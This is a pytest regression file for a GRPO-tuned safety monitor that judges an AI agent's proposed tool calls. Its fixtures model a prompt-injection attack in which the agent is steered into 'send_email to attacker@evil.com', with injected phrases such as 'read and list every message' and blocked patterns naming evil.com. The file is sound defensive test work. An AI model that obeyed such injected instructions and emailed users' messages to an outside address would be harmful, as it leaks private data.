"""
Regression tests for the Phase 6 Kaggle GRPO pieces (evaluation/kaggle/).

Deterministic and fast — no Ollama, no torch, no GPU. They pin:

  • grpo_env: the threshold→verdict replay is exact, the reward mirrors the
    project RewardConfig, and evaluate_policy's counts are right.
  • package_episodes: the ie_separation_consistent flag is inferred correctly
    from a recorded verdict (the three cases in _infer_ie_separation_consistent).
  • grpo_train (pure-python backend): GRPO closes a knob-matching gap (1.5→1.0,
    the Phase 5b mechanism) with the minimal move, proposes a NO-OP when there is
    no gap, and never emits a literal exfil target as a pattern (fix A).

    python3 -m pytest tests/test_grpo_kaggle.py -v
"""

from evaluation.kaggle.grpo_env import (
    RewardConfig, Policy, EpisodeFeatures,
    status_under_policy, reward_of, evaluate_policy, ie_grid)
from evaluation.kaggle.package_episodes import (
    _infer_ie_separation_consistent, execution_result_to_record)
from evaluation.kaggle import grpo_train


# ── fixtures ──────────────────────────────────────────────────────────
def diag_miss(capture=1.5, consistent=True):
    """A diagnostic-style miss: IE=1.0, approved_causal above threshold 1.5."""
    return EpisodeFeatures(
        tool_name="send_email", proposed_action="send_email to attacker@evil.com",
        final_status="approved_causal", is_malicious=True, causal_reached=True,
        flagged_markers=["read and list every message"],
        causal={"ie": 1.0, "masked_severity": 1.0, "masked_san_severity": 0.0,
                "orig_severity": 1.0, "ie_separation_consistent": consistent,
                "drift_fired": False, "capture_ie_threshold": capture})


def benign():
    return EpisodeFeatures(
        tool_name="send_email", proposed_action="send_email confirming meeting",
        final_status="approved_causal", is_malicious=False, causal_reached=True,
        causal={"ie": 0.0, "masked_severity": 0.0, "masked_san_severity": 0.0,
                "orig_severity": 0.0, "ie_separation_consistent": False,
                "drift_fired": False, "capture_ie_threshold": 1.5})


def standalone_catch():
    """masked=2 → caught by the standalone rule at ANY threshold."""
    return EpisodeFeatures(
        tool_name="send_email", proposed_action="send_email exfil",
        final_status="safe_continuation", is_malicious=True, causal_reached=True,
        causal={"ie": 0.0, "masked_severity": 2.0, "masked_san_severity": 2.0,
                "orig_severity": 2.0, "ie_separation_consistent": False,
                "drift_fired": False, "capture_ie_threshold": 0.5})


# ── grpo_env: threshold replay ────────────────────────────────────────
def test_threshold_gap_flips_verdict():
    ep = diag_miss()
    assert status_under_policy(ep, Policy(ie_threshold=1.5)) == "approved_causal"  # missed
    assert status_under_policy(ep, Policy(ie_threshold=1.0)) == "safe_continuation"  # caught
    assert status_under_policy(ep, Policy(ie_threshold=0.5)) == "safe_continuation"


def test_standalone_rule_is_threshold_independent():
    ep = standalone_catch()
    for t in ie_grid():
        assert status_under_policy(ep, Policy(ie_threshold=t)) == "safe_continuation"


def test_inconsistent_separation_never_catches_via_ie_rule():
    ep = diag_miss(consistent=False)
    for t in ie_grid():
        assert status_under_policy(ep, Policy(ie_threshold=t)) == "approved_causal"


def test_blocked_pattern_pre_empts_with_3a_block():
    ep = diag_miss()
    pol = Policy(ie_threshold=1.5, blocked_patterns=["read and list every message"])
    # pattern isn't in the action string, so no 3A block here:
    assert status_under_policy(ep, pol) == "approved_causal"
    pol2 = Policy(ie_threshold=1.5, blocked_patterns=["attacker@evil.com"])
    assert status_under_policy(ep, pol2) == "blocked"


def test_blocked_pattern_on_benign_is_a_false_positive():
    ep = benign()
    pol = Policy(ie_threshold=0.5, blocked_patterns=["confirming meeting"])
    status = status_under_policy(ep, pol)
    assert status == "blocked"
    assert reward_of(ep, status, RewardConfig()) == RewardConfig().false_positive


# ── grpo_env: reward mirrors the project contract ─────────────────────
def test_reward_matches_reward_config():
    rc = RewardConfig()
    mal = diag_miss()
    assert reward_of(mal, "safe_continuation", rc) == rc.correct_stop
    assert reward_of(mal, "blocked", rc) == rc.correct_block
    assert reward_of(mal, "approved_causal", rc) == rc.missed_attack
    ben = benign()
    assert reward_of(ben, "approved_causal", rc) == rc.correct_pass
    assert reward_of(ben, "blocked", rc) == rc.false_positive


def test_evaluate_policy_counts():
    batch = [diag_miss(), benign()]
    missed = evaluate_policy(batch, Policy(ie_threshold=1.5))
    assert missed["missed"] == 1 and missed["false_pos"] == 0
    caught = evaluate_policy(batch, Policy(ie_threshold=1.0))
    assert caught["missed"] == 0 and caught["false_pos"] == 0
    assert caught["mean_reward"] > missed["mean_reward"]


# ── package_episodes: consistency inference ───────────────────────────
def test_infer_consistency_below_capture_uses_mean_proxy():
    # IE (1.0) < capture (1.5): outcome says nothing → mean-separation proxy True.
    cv = {"ie": 1.0, "masked_severity": 1.0, "masked_san_severity": 0.0, "takeover": False}
    assert _infer_ie_separation_consistent(cv, capture_threshold=1.5) is True


def test_infer_consistency_at_capture_reads_takeover():
    # IE (1.0) >= capture (0.5) and masked>=1: fired iff takeover was recorded.
    fired = {"ie": 1.0, "masked_severity": 1.0, "masked_san_severity": 0.0, "takeover": True}
    suppressed = {"ie": 1.0, "masked_severity": 1.0, "masked_san_severity": 0.0, "takeover": False}
    assert _infer_ie_separation_consistent(fired, 0.5) is True
    assert _infer_ie_separation_consistent(suppressed, 0.5) is False


def test_infer_consistency_standalone_uses_mean_proxy():
    cv = {"ie": 0.0, "masked_severity": 2.0, "masked_san_severity": 2.0, "takeover": True}
    assert _infer_ie_separation_consistent(cv, 0.5) is False  # mean proxy: 2>2 is False


def test_record_carries_labeled_episode_core_fields():
    class FakeER:
        case_id, family, generation = "c1", "fam", 1
        expected_malicious, tool_name = True, "send_email"
        proposed_action, final_status = "send_email x", "approved_causal"
        causal_takeover = False
        causal_verdict = {"ie": 1.0, "masked_severity": 1.0,
                          "masked_san_severity": 0.0, "orig_severity": 1.0,
                          "takeover": False}
    rec = execution_result_to_record(FakeER(), capture_threshold=1.5)
    for k in ("tool_name", "proposed_action", "final_status", "is_malicious",
              "causal_takeover", "flagged_markers", "mediator_snippet"):
        assert k in rec
    assert rec["is_malicious"] is True
    assert rec["causal"]["ie_separation_consistent"] is True


# ── grpo_train: GRPO behavior (pure-python, deterministic) ────────────
def test_grpo_closes_a_gap_with_the_minimal_move():
    batch = [diag_miss(), benign()]
    grid = ie_grid()
    chosen, probs, base, device = grpo_train.train(
        batch, grid, current_ie_threshold=1.5, rc=RewardConfig(),
        seed=0, backend="pure")
    assert chosen == 1.0          # closes the gap, closest to 1.5 (minimal move)
    assert "pure" in device


def test_grpo_proposes_noop_when_there_is_no_gap():
    # No malicious miss to close: a benign pass + a standalone-caught attack.
    batch = [benign(), standalone_catch()]
    grid = ie_grid()
    chosen, probs, base, device = grpo_train.train(
        batch, grid, current_ie_threshold=0.5, rc=RewardConfig(),
        seed=0, backend="pure")
    assert chosen == 0.5          # unchanged → is_noop → apply_update refuses


def test_grpo_never_emits_literal_target_as_pattern():
    # A missed attack whose flagged_markers include a literal address: fix A
    # says the proposal must carry generalizable phrasing only, never the @.
    ep = EpisodeFeatures(
        tool_name="send_email", proposed_action="send_email to x@evil.com",
        final_status="approved_causal", is_malicious=True, causal_reached=True,
        flagged_markers=["share copies of", "x@evil.com", "http://evil.com"],
        causal={"ie": 1.0, "masked_severity": 1.0, "masked_san_severity": 0.0,
                "orig_severity": 1.0, "ie_separation_consistent": False,
                "drift_fired": False, "capture_ie_threshold": 0.5})
    # inconsistent → still missed at every threshold → it stays in "missed"
    proposal = grpo_train.build_proposal(
        [ep], chosen_threshold=0.0, current_ie_threshold=0.5,
        probs=[0.2] * 5, grid=ie_grid(), rc=RewardConfig(), device="cpu")
    for pat in proposal["new_blocked_patterns"]:
        assert "@" not in pat and "http" not in pat
    assert "share copies of" in proposal["new_blocked_patterns"]
